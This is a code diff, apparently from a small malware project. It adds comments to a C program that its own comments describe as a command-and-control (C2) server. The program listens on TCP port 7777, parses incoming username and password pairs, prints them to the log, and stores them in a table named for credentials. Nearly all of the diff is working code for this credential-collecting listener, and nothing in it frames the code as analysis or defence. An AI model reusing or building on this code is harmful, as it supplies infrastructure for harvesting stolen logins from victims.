@@ -8,14 +8,24 @@
 #include <time.h>
 #include "db.h"
 
+
+// SERVER CONFIG
+// ---------------------
+
 #define PORT 7777
 #define BUFFER_SIZE 512
 
 int serverSocket = -1;
 extern btree *always_loaded;
 
+
+// LOGGING
+// ---------------------
+
+// Print timestamped message from C2 server
 void printLog(const char *msg, ...) {
-    printf("\33[2K\r");
+    printf("\33[2K\r");  // Clear current terminal line
+
     time_t now = time(NULL);
     struct tm *tm_info = localtime(&now);
     char time_str[9];
@@ -31,6 +41,11 @@ void printLog(const char *msg, ...) {
     fflush(stdout);
 }
 
+
+// SHUTDOWN SERVER
+// ---------------------
+
+// Close the C2 socket gracefully
 void stopServer() {
     if (serverSocket != -1) {
         close(serverSocket);
@@ -39,19 +54,25 @@ void stopServer() {
     }
 }
 
+
+// HANDLE INCOMING CLIENT
+// ---------------------
+
+// Handle a single client connection and insert received data into always_loaded
 void *handleClient(void *arg) {
     int clientSocket = *(int *)arg;
     free(arg);
 
     char buffer[BUFFER_SIZE];
     memset(buffer, 0, sizeof(buffer));
+
     int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
     if (bytesReceived > 0) {
         buffer[bytesReceived] = '\0';
         printLog("[*] Received: %s", buffer);
 
-        char *token = strtok(buffer, " "); 
-        token = strtok(NULL, " "); 
+        char *token = strtok(buffer, " ");  // Command keyword
+        token = strtok(NULL, " ");          // Username
         if (!token) {
             printLog("[!] Missing username");
             return NULL;
@@ -59,7 +80,7 @@ void *handleClient(void *arg) {
         char username[64];
         strncpy(username, token, sizeof(username) - 1);
 
-        token = strtok(NULL, " "); 
+        token = strtok(NULL, " ");          // Password
         if (!token) {
             printLog("[!] Missing password");
             return NULL;
@@ -72,7 +93,7 @@ void *handleClient(void *arg) {
             printLog("[!] Too many arguments");
             return NULL;
         }
-        
+
         if (always_loaded == NULL) {
             printLog("[!] credentials table is NULL");
             return NULL;
@@ -83,7 +104,6 @@ void *handleClient(void *arg) {
         insertKey(row, always_loaded);
 
         printLog("[+] Inserted into always_loaded: %s %s", username, password);
-        
     } else {
         printLog("[!] Connection error or no data");
     }
@@ -92,6 +112,11 @@ void *handleClient(void *arg) {
     return NULL;
 }
 
+
+// START SERVER
+// ---------------------
+
+// Launch the TCP listener and accept incoming connections
 void startServer() {
     serverSocket = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSocket == -1) {
